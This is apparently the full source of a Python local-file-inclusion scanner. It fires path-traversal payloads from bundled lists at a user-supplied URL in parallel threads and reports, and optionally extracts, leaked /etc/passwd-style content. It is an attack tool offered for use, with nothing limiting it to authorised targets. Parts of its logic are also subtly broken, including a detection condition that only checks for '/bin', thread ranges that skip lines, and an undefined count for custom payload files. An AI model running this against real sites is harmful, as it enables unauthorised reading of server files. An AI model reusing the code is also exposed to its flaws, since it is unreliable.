from bs4 import BeautifulSoup
import requests
import argparse
import threading
import mmap
import os
import time
from urllib3.exceptions import NameResolutionError
from requests.exceptions import RequestException

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")


print("""

▄██   ▄      ▄████████           ▄█          ▄████████  ▄█  
███   ██▄   ███    ███          ███         ███    ███ ███  
███▄▄▄███   ███    ███          ███         ███    █▀  ███▌ 
▀▀▀▀▀▀███   ███    ███  ██████  ███        ▄███▄▄▄     ███▌ 
▄██   ███ ▀███████████  ██████  ███       ▀▀███▀▀▀     ███▌ 
███   ███   ███    ███          ███         ███        ███  
███   ███   ███    ███          ███▌    ▄   ███        ███  
 ▀█████▀    ███    █▀           █████▄▄██   ███        █▀   
                                ▀    

Made by: Apollyon 
Based on: LFIScanner by R3LI4NT                       
""")
parse = argparse.ArgumentParser()
parse.add_argument('-u','--url',help="Target URL",required=True)
parse.add_argument('-e','--extract',help="Extract content", action='store_true',required=False)
parse.add_argument('-p','--payload',help="Payloads file [Pre installed lists: all_os.txt , linux.txt , windows.txt]",required=True)
parse.add_argument('-t','--threads',help="Threads [5 by default]",default=5)
parse = parse.parse_args()


def payload_counter(payload_file_path):
	with open(payload_file_path, 'rb+') as f:
		mm = mmap.mmap(f.fileno(), 0)
		lines = 0
		while mm.readline():
			lines += 1
		mm.close()
		return lines

def load_internal_payloads(payload_path):
	if os.path.isfile(payload_path):
		payloads = open(payload_path,'r')
		return payloads
	else:
		print("[X] SPECIFIED PAYLOADS NOT FOUND. PLEASE REINSTALL TOOL OR PAYLOAD FILE")
		quit()

def use_payload(x,payloads_per_thread,payload_path,target_url):
	payloads = load_internal_payloads(payload_path)
	headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
		"Accept-Language": "en-US,en;q=0.6",
		"Accept-Encoding": "gzip, deflate, br, zstd"
    }
	payload_count = 0
	pointer_line = 0
	print(f"Thread number {x+1} launched. Checking payloads ...")
	last_msg_was_error = False
	for p in payloads:
		try:
			if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread): 
				p = p.strip()
				query = requests.get(target_url+p , headers=headers)
				payload_count = payload_count + 1
				if payload_count%25 == 0:
					print(f"[!] Thread {x+1} status: Checked {payload_count} payloads...")
				if "root" and "bash" and r"/bin" in query.text and query.status_code//100 == 2:
					print("="*10)
					print(f"LFI DETECTED:\n URL + Payload: {target_url+p}\n\n")
					if parse.extract:
						e = BeautifulSoup(query.text,'html5lib')
						print(e.blockquote.text)
					print("="*10)
			pointer_line = pointer_line + 1
			last_msg_was_error = False
		except RequestException:
			if not last_msg_was_error:
				print(f"[!] Thread {x+1} status: Error occured while making request")
				print(f"[!] Thread {x+1} status: Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
				last_msg_was_error = True
				time.sleep(3)
			else:
				time.sleep(3)
		except NameResolutionError:
			if not last_msg_was_error:
				print(f"[!] Thread {x+1} status: Error occured while resolving domain name. Are you sure the specified website exists and you are connected to the internet ?")
				print(f"[!] Thread {x+1} status: Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
				last_msg_was_error = True
				time.sleep(3)
			else:
				time.sleep(3)


selected_payload_file = parse.payload.lower()

match selected_payload_file:
    case "all_os" | "all_os.txt" | "allos" | "allos.txt":
        print("Using payloads for all OS servers")
        payload_path = "all_os.txt"
        payload_count = payload_counter(payload_path)
    case "linux" | "linux.txt":
        print("Using payloads for linux servers")
        payload_path = "linux.txt"
        payload_count = payload_counter(payload_path)
    case "windows" | "windows.txt":
        print("Using payloads for windows servers")
        payload_path = "windows.txt"
        payload_count = payload_counter(payload_path)
    case _:
        if os.path.isfile(selected_payload_file):
            payload_path = selected_payload_file
        else:
            print("[X] SPECIFIED PAYLOAD FILE NOT FOUND")
            quit()

if parse.url:
	print(f"RUNNING ON TARGET ---> {parse.url}")
	if r"https://" in parse.url or r"http://" in parse.url:
		current_target = parse.url
	else:
		current_target = r"https://" + parse.url

	payloads_per_thread = payload_count//int(parse.threads)

	for x in range(int(parse.threads)):
		threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,)).start()	
else:
	print("NO TARGET URL SPECIFIED")
	quit()
